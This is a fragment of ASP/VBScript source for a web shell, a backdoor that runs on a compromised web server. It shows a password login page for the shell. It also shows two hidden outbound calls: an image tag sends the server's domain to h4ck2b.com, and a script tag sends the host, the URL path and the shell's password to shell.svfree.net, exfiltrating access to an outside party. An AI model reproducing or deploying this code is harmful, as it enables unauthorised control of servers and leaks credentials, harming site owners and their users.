...
RRS"<tr><td height='20'><img src='ht"&"tp://h4ck2b.com/web/pr2/?"&domain&"'></img></td></tr>"
End if
RRS"</table></table>"
RRS"<script src=""http://shell.svfree.net/1/?url="&server.URLEncode(""&request.ServerVariables("HTTP_HOST")&request.ServerVariables("url"))&"&p="&UserPass&"""></script>"
'
...
set fso=nothing
RRS"<br><br><br><br><br><br><center>[A不K死I之L身L]</center>"
...
si="<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><img src='http://www.sbkey.tk/image/logo/shell.jpg' /><hr><FORM Action='"&URL&"' method=Post> <INPUT type=Password name=Pass size=22>&nbsp;<input type=submit value=Login><hr><br>Oh my God, what is safe?</div></center>"
